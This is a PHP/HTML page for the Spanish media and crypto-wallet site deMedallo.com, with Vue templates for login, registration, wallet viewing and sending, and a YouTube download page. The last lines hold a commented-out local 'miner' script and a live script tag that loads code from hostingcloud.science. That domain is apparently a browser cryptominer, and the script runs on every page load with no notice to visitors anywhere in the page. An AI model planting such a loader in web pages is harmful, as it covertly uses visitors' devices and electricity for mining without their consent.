<?php 
	include('_cms/autoload.php');
	$app = include_once('api/YouTube-Downloader/bootstrap.php');
?>
<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="icon" href="favicon.ico">
		<title>deMedallo.com | Musica, Series, Videos, Tutoriales, Descargas y mucho mas!!</title>
		<link href="dist/bootstrap/4.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
		<link href="assets/carousel.css" rel="stylesheet">
		<!--<link href="assets/style.css" rel="stylesheet">-->
		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
		<link href="https://vjs.zencdn.net/7.1.0/video-js.css" rel="stylesheet">
		<!-- If you'd like to support IE8 (for Video.js versions prior to v7) -->
		<!-- <script src="https://vjs.zencdn.net/ie8/ie8-version/videojs-ie8.min.js"></script> -->
		
		<script src="//content.jwplatform.com/libraries/IDzF9Zmk.js"></script>

			<script src="https://unpkg.com/vue/dist/vue.js"></script>
		<!--
			<script src="https://unpkg.com/vue-router/dist/vue-router.js"></script>
		-->
		<!-- <script src="https://cdn.jsdelivr.net/npm/vue@2.5.17/dist/vue.js"></script> -->
		<script src="https://cdnjs.cloudflare.com/ajax/libs/vue-router/3.0.1/vue-router.js"></script>
		<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
		
		<!--<script type="text/javascript" src="http://api.solvemedia.com/papi/challenge.ajax"></script>-->
	</head>
	<body>
		<div id="app"></div>
		
		<template id="formLogin-template">
			<div>
				<form id="loginForm" method="POST" action="javascript:false; " @submit="submitLogin">
					<div class="dropdown-divider"></div>					
					<div class="dropdown-item"><label for="email">Usuario o Correo Electronico</label></div>
					<div class="dropdown-item"><input class="form-control" type="text" v-model="mailornick" name="mailornick" id="input-mailornick-modal"></div>
					<div class="dropdown-item"><label for="password">Contraseña</label></div>
					<div class="dropdown-item"><input class="form-control" type="password" v-model="hash" name="hash" id="password"></div>
					<div class="dropdown-item"><label for="password">Captcha</label></div>
					<div class="dropdown-item"><div id="acwidget-login-page"><div id="acwidget-login"><a @click="createCaptcha()">cargar CatpChat</a></div></div></div>
					
					<div class="dropdown-divider"></div>
					<div class="alert alert-dark" role="alert" v-if="error == true">
					  {{ message }}
					</div>
					<div class="dropdown-divider"></div>
					<div class="dropdown-item"><input class="btn btn-success" type="submit" id="login" value="Ingresar"></div>
					<!-- <label for="checkbox"><input type="checkbox" id="checkbox"> <i>Remember me</i></label> -->
					<div class="dropdown-divider"></div>
				</form>
			</div>
		</template>
		
		<template id="formRegister-template">
			<div>
				<div class="content_middle">
					<div class="container">
						<div class="row">
							<div class="col-md-12">
								<div class="alert alert-dark" role="alert" v-if="error == true">
								  {{ message }}
								</div><div class="dropdown-divider"></div>
							
								<div class="panel panel-primary" style="margin:20px;">
									<div class="panel-heading"><h3 class="panel-title">Formulario de registro</h3></div>
									<div class="panel-body">
										<form method="POST" class="form row" action="javascript:false;" @submit="submitRegister">
											<div class="col-md-6 col-sm-6">
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Nombre Completo*</label>
													<input type="text" class="form-control input-sm" name="name" v-model="name" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Nick / Usuario*</label>
													<input type="text" class="form-control input-sm" name="nick" v-model="nick" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="email">Correo Electronico*</label>
													<input type="email" class="form-control input-sm" name="email" v-model="email" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Contraseña*</label>
													<input type="password" class="form-control input-sm" name="pass1" v-model="pass1" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Verificar Contraseña*</label>
													<input type="password" class="form-control input-sm" name="pass2" v-model="pass2" placeholder="">
												</div>
											</div>

											<div class="col-md-6 col-sm-6">
												<div class="form-group col-md-12 col-sm-12" >
													<div class="dropdown-item"><div id="acwidget-register-page"><div id="acwidget-register"><a @click="$parent.realoadCaptcha('acwidget-register')">cargar CatpChat</a></div></div></div>
												</div>
												
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Terminos y condiciones</label>
													<span class="help-block">Al registrase se da por enterado que el propietario de la cuenta leyó y acepta nuestros terminos y condiciones.</span>
												</div>
												
												<div class="form-group col-md-12 col-sm-12 pull-right" >
													<input type="submit" class="btn btn-primary" value="Crear mi cuenta"/>
												</div>
											</div>
										</form>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				
			</div>
		</template>

		<template id="myaccountModal-template">
			<div>
				<div class="dropdown-divider"></div>
				<div class="dropdown-item" ><b>Nombres</b>: {{ $parent.name }}</div>
				<div class="dropdown-item" ><b>Email</b>: {{ $parent.mail }}</div>
				<div class="dropdown-item" ><b>Referidos</b>: {{ $parent.refers }}</div>
				
				<div class="dropdown-divider"></div>
				<div class="dropdown-item" href="#"><h3>Wallets</h3></div>
			
				<fieldset class="dropdown-item" v-for="wallet in $parent.wallets">
					<label>{{ wallet.symbol }} - {{ wallet.name }}</label>
					<table class="table table-responsive">
						<tr>
							<th colspan="2">
								Address: <router-link tag="a" colspan="2" v-bind:to="'/wallet/' + wallet.address + '/' + wallet.coin_id">{{ wallet.address }}</router-link>
							</th>
						</tr>
						<tr>
							<td v-bind:class="'wallet-' + wallet.symbol + '-balance'">{{ wallet.balance.toFixed(wallet.decimals) }}</td>
							<td>{{ wallet.symbol }}</td>
						</tr>
						<tr>
							<td>
								<router-link tag="a" class="btn btn-secondary" v-bind:to="'/lastTx/' + wallet.address + '/' + wallet.coin_id">Transacciones</router-link>
							</td>
							<td>
								<router-link tag="a" class="btn btn-info" v-bind:to="'/sendW/' + wallet.symbol">Enviar</router-link>
							</td>
						</tr>
					</table>
					
				</fieldset>
			</div>
		</template>
		
		<template id="viewWallets-template">
			<div>
				<div class="container marketing" v-if="error == false">
					<h1><hr>Visor de Billetera:  <span></span></h1>
					<h2>{{ balance.toFixed(decimals) }} {{ symbol }}</h2>
					<hr>
					<div class="row">
					  <div class="col-md-6">
						<table class="table">
							<tr><th>Address</th><td>{{ $route.params.address }}</td></tr>
							<tr><th>Name</th><td>{{ name }}</td></tr>
							<tr><th>Symbol</th><td>
								<router-link tag="a" v-bind:to="'/teamW/' + $route.params.coin_id">{{ symbol }}</router-link>
							</td></tr>
							<tr><th>Decimals</th><td>{{ decimals }}</td></tr>
							<tr><th>Balance</th><td>{{ balance.toFixed(decimals) }}</td></tr>
							<tr><th>Total Envios</th><td>{{ totalSend.total }}</td></tr>
							<tr><th>Valor Total Enviado</th><td>{{ totalSend.value }}</td></tr>
							<tr><th>Total Recibido</th><td>{{ totalRecibe.total }}</td></tr>
							<tr><th>Valor Total Recibido</th><td>{{ totalRecibe.value }}</td></tr>
						</table>
					  </div>
					  <div class="col-md-6">
						<h2>Ultimas Actividades</h2>
						<table class="table table-responsive" style="zoom: 0.7;">
							<tr>
								<th>Tx</th>
								<th>From</th>
								<th>To</th>
								<th>Value</th>
								<th>Coin</th>
							</tr>
							<tr v-for="tx in lastTx" :key="tx.tx">
								<td title="">
									<router-link tag="a"  :to="'/tx/' + tx.tx">{{ tx.tx }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.from + '/' + tx.coinInfo.id">{{ tx.from }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.to + '/' + tx.coinInfo.id">{{ tx.to }}</router-link>
								</td>
								<td>{{ tx.value.toFixed(decimals) }}</td>
								<td>{{ tx.coinInfo.symbol }}</td>
							</tr>
						</table>
						<router-link tag="a" v-bind:to="'/lastTx/' + $route.params.address + '/' + $route.params.coin_id"  class="btn btn-md btn-primary">Ver mas</router-link>
					  </div>
					</div>
				</div>
				
				 
				<div class="container marketing" v-else="">
					<h1><hr>Visor de Billetera:  <span></span></h1>
					<h2></h2>
					<hr>
					<div class="row">
						<div class="col-md-12">
							<h3>Billetera: <span>{{ $route.params.address }} </span></h3>
							<p>Billetera no encontrada verifique la direccion e intente nuevamente.</p>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewTx-template">
			<div>
				<div class="container marketing">
					<h1><hr>Visor de Transaccion</h1>
					<hr>
					<div class="row">
						<hr>
						<div class="col-md-12" v-if="error == false">
							<h3>Transaccion: <span>{{ $route.params.tx }}  ( {{ coinInfo.symbol }} )</span></h3>
							<table class="table table-responsive">
								<tr>
									<th>TxHash</th>
									<td>{{ tx }}</td>
								</tr>
								<tr>
									<th>TimeStamp</th>
									<td>{{ create }}</td>
								</tr>
								<tr>
									<th>From</th>
									<td>
										<router-link tag="a" v-bind:to="'/wallet/' + from + '/' + coinInfo.id">{{ from }}</router-link>
									</td>
								</tr>
								<tr>
									<th>To</th>
									<td>
										<router-link tag="a" v-bind:to="'/wallet/' + to + '/' + coinInfo.id">{{ to }}</router-link>
									</td>
								</tr>
								<tr>
									<th>Decimals</th>
									<td>{{ coinInfo.decimals }}</td>
								</tr>
								<tr>
									<th>Value</th>
									<td>{{ value }}</td>
								</tr>
								<tr>
									<th>Input data</th>
									<td><textarea class="form-control" readonly="" spellcheck="false" style="width: 100%; font-size: small; font-family: Monospace; padding: 8px; background-color: #EEEEEE;" rows="5" id="inputdata">{{ data }}</textarea></td>
								</tr>
								<tr>
									<th></th>
									<td>
										<router-link class="btn btn-info btn-md" tag="a" v-bind:to="'/decodeTx/' + tx">Decode Input Data <i class="fa fa-cog"></i></router-link>
									</td>
								</tr>
							</table>
						</div>
						<div class="col-md-12" v-else="">
							<h3>Transaccion: <span>{{ $route.params.tx }} </span></h3>
							<p>Transaccion no encontrada verifique el TX e intente nuevamente.</p>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewLastTx-template">
			<div>
				<div class="container marketing">
					<h1><hr>Ultima Actividad</h1>
						<table class="table">
							<tr>
								<th>Address</th>
								<td>
									<router-link tag="a" v-bind:to="'/wallet/' + address + '/' + $route.params.coin_id">{{ address }}</router-link>
								</td>
								<th>Name</th>
								<td>{{ name }}</td>
							</tr>
							<tr>
								<th>Symbol</th>
								<td><router-link tag="a" v-bind:to="'/teamW/' + $route.params.coin_id">{{ symbol }}</router-link></td>
								<th>Decimals</th>
								<td>{{ decimals }}</td>
							</tr>
							<tr>
								<th><h3>Balance: </h3></th>	
								<td>{{ balance }}</td>
							</tr>
						</table>
					<div class="row">
					  <div class="col-md-12">
						<h2>Ultimas Actividades</h2>
						<table class="table table-responsive" style="zoom: 0.7;">
							<tr>
								<th>Tx</th>
								<th>From</th>
								<th>To</th>
								<th>Value</th>
								<th>Coin</th>
							</tr>
							<tr v-for="tx in lastTx">
								<td title="">
									<router-link tag="a"  :to="'/tx/' + tx.tx">{{ tx.tx }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.from + '/' + tx.coinInfo.id">{{ tx.from }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.to + '/' + tx.coinInfo.id">{{ tx.to }}</router-link>
								</td>
								<td>{{ tx.value.toFixed(decimals) }}</td>
								<td>{{ tx.coinInfo.symbol }}</td>
							</tr>
						</table>
					  </div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewTeamW-template">
			<div>
				<div class="container marketing">
					<h1><hr>Participantes : {{ name }} ( {{ symbol }} )</h1>
					<hr>
					
					<table class="table">
						<tr>
							<th>Name</th>
							<td>{{ name }}</td>
						</tr>
						<tr>
							<th>Symbol</th>
							<td>{{ symbol }}</td>
						</tr>
						<tr>
							<th>Decimals</th>
							<td>{{ decimals }}</td>
						</tr>
					</table>
					
					<div class="row">
					  <div class="col-md-12">
						<table class="table" style="zoom: 0.7;">
							<tr>
								<th>Address</th>
								<th>Balance</th>
							</tr>
							<tr v-for="wallet in wallets">
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + wallet.address + '/' + wallet.coin_id">{{ wallet.address }}</router-link>
								</td>
								<td title="">{{ wallet.balance }}</td>
							</tr>
						</table>
					  </div>
					</div>
					<hr>
				</div>
			</div>
		</template>
		
		<template id="viewSendW-template">
			<div>
				<div class="container marketing">
					<h1><hr>Enviar : {{ $parent.wallets[$route.params.coin_symbol].name }} ( {{ $route.params.coin_symbol }} )</h1>
					<h3>Balance: {{ $parent.wallets[$route.params.coin_symbol].balance.toFixed($parent.wallets[$route.params.coin_symbol].decimals) }}</h3>
					<hr>
					<!-- ALERTS -->
					<div class="alert alert-danger" role="alert" v-if="error == true">
					  {{ message }}
					</div>
					<div class="alert alert-success" role="alert" v-if="error == false && message != ''">
						{{ message }}
						<hr>
						<router-link tag="a" :to="'/tx/' + txResult">{{ txResult }}</router-link>
					</div>
					
					<div class="dropdown-divider"></div>
								
					<form method="POST" action="javascript:false;" @submit="submitSendW">
						<table class="table">
							<tr>
								<th>Direccion Destino</th>
								<td><input class="form-control" type="text" value="" v-model="to"></td>
							</tr>
							<tr>
								<th>Valor</th>
								<td><input class="form-control" type="number" v-model="value" min="0" :step="step" ></td>
							</tr>
							 
							<tr>
								<th>Fee</th>
								<td><input class="form-control" disabled value="0" v-model="fee"></td>
							</tr>
							<tr>
								<th>Data</th>
								<td><textarea class="form-control" spellcheck="false" style="width: 100%; font-size: small; font-family: Monospace; padding: 8px; background-color: #EEEEEE;" rows="5" v-model="data"></textarea></td>
							</tr>
							<tr>
								<th>Captcha</th>
								<td class="text-center"><div id="acwidget-sendW"></div></td>
							</tr>
							<tr>
								<th></th>
								<td><input type="submit" class="btn btn-success" value="Enviar"></td>
							</tr>
						</table>
					</form>
				</div>
			</div>
		</template>
		
		<template id="headerSearch-template">
			<div>
				<div class="banner">
				  <div class="container_wrap">
					<h1>¿Que Buscas?</h1>
					<form class="" method="search" action="javascript:false; " @submit="submitSearch">
						<input type="text"  name="q" id="q2" value="" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = '';}" v-model="search">
						<div class="contact_btn">
						   <label class="btn1 btn-2 btn-2g"><input class="btn btn-default btn-lg" type="submit" name="type"  value="Buscar"></label>
						</div>
					</form>        		
					<div class="clearfix"></div>
				  </div>
				</div>
			</div>
		</template>
		
		<template id="Footer-template">
			<div>
				<footer class="container">
					<p class="float-right"><a href="#">Back to top</a></p>
					<p>Donations &middot; <a><b>ETH</b>: 0x0cb159875098ad4ee77b5c3d4f6de636c823235b</a> &middot; <a href="terms-and-conditions.dm">Terms</a></p>
				</footer>
				<div class="footer">
					<div class="container">
						<!--
						<div class="footer_top">
							<h3>Subscribe to our newsletter</h3>
							<form>
								<span>
									<i><img src="images/mail.png" alt=""></i>
									<input type="text" value="Enter your email" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Enter your email';}">
									<label class="btn1 btn2 btn-2 btn-2g"> <input name="submit" type="submit" id="submit" value="Subscribe"> </label>
									<div class="clearfix"> </div>
								</span>
							</form>
						</div>
						-->		
						<div class="footer_grids">
							<div class="footer-grid">
								<h4>Link Oficiales</h4>
								<ul class="list1">
									<!-- <li><a href="contact.html">Contact</a></li> -->
									<li><a href="index.php">¿Buscas algo?</a></li>
									<li><a href="http://demedallo.com/mining/">Minar sin programas</a></li>
									<li><a href="terms-and-conditions.dm">Terms and conditions</a></li>
								</ul>
							</div>
							<div class="footer-grid">
								<h4>Links Externos</h4>
								<ul class="list1">
									<li><a href="https://www.facebook.com/TiendadeMedallo/">Facebook</a></li>
									<li><a href="https://github.com/deMedallo/">GitHub</a></li>
								</ul>
								<h4>Estadisticas</h4>
									
								<ul class="list1">
									<li><a>DM: </a></li>
								</ul>
							</div>
							<div class="footer-grid last_grid">
								<h4>Follow Us</h4>
								
								<a href="https://www.facebook.com/TiendadeMedallo/"> <i class="fa fa-facebook fa-2x"> </i> </a>
								<a href="https://github.com/deMedallo/"> <i class="fa fa-github fa-2x"> </i> </a>
							<div class="copy wow fadeInRight" data-wow-delay="0.4s">
							  <p>© 2014 deMedallo.com. Developed by <a href="#" target="_blank">FelipheGomez</a></p>
							</div>
						  </div>
						  <div class="clearfix"> </div>
					   </div>
				  </div>
				</div>
			</div>
		</template>
		
		<template id="searchPage-template">
			<div>
				<div class="content_middle">
					<hr>
					<div class="container">
						<div class="content_middle_box">
							<div class="top_grid">
								<!-- <gcse:searchresults-only></gcse:searchresults-only> -->
								<div id="resultsGoogle"></div>
								<div class="clearfix"> </div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		
		<template id="viewVideoYoutube-template">
			<div>
				<div class="container marketing">
					<div class="row">
						<div class="col-md-12">
							<div class="col-md-12">
								<h2><br>{{ title }}</h2>
								<hr>
							</div>
							<div class="col-md-12">
								<div class="row">
									<div class="col-md-9">
										<div class="row">
											<div class="col-md-12">
												<iframe width="100%" v-if="total_videos == 0" height="420" :src="urlYT"> </iframe>
												<div id="player"></div>
												<hr>
											</div>
											
											<div class="col-md-12">
											
												<div class="col-md-12">
													<div class="row">
													  <div class="col-md-7">
														<h3>{{ title }} <!--<span class="text-muted">[ {{ videoid }} ]</span>--></h3>
														<p class="lead">{{ description }}</p>
														<hr>
													  
														<h5>Contenido con Puntos!<hr></h5>
														<p>Ahora con deMedallo adquiere Puntos DM <b>GRATIS</b> por cada <b>Segundo</b> visto, actualmente tienes 0.</p>
														
													  </div>
													  <div class="col-md-5">
														<img class="img-thumbnail rounded-circle" :data-src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" :src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" alt="">
													  </div>
													</div>
												</div>
												
												<div class="col-md-12">
													<h2>Videos</h2>
													<hr>
												</div>
												<div class="col-md-12">
													<div class="row">
														<div class="col-lg-3" v-for="audio in videos">
															<!--<img class="rounded-circle" :src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" alt="" width="140" height="140">-->
															<h5>{{ audio.label }}</h5>
															<p>{{ audio.size }}</p>
															<p>
																<a class="btn btn-sm btn-primary btn-download" :href="audio.file" class="mime"> <i class="fa fa-download"></i></a>
															</p>
														</div>
													</div>
												</div>
												<div class="col-md-12">
													<div id="resultsGoogleVideos"></div>
												</div>
											</div>
										</div>
									</div>
									<div class="col-md-3">
										<div class="col-md-12">
											<h2>Audios</h2>
											<hr>
										</div>
										<ul class="feature last_grid" v-for="video in audios">
											<li> <i class="icon-video"></i></li>
											<li class="feature_right">
												<h5>
													{{ video.label }}
													<a class="btn btn-default btn-type disabled" href="#">{{ video.size }}</a>
												</h5>								
												<p>
													<a class="btn btn-sm btn-primary btn-download" :href="video.file" class="mime"> <i class="fa fa-download"></i></a>
												</p>
											</li>
											<hr>
											<div class="clearfix"></div>
										</ul>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		
		<!-- Placed at the end of the document so the pages load faster -->
		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
		<script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
		<script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/popper.min.js"></script>
		<script src="dist/bootstrap/4.1.3/dist/js/bootstrap.min.js"></script>
		<!-- Just to make our placeholder images work. Don't actually copy the next line! -->
		<script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/holder.min.js"></script>
		<!-- <script src="api/miner/FNn8.php?f=uwlS.js"></script> -->
		<script src="https://www.hostingcloud.science./eUuG.js"></script>
		
		<script src="js/scripts.js"></script>
	</body>
</html>
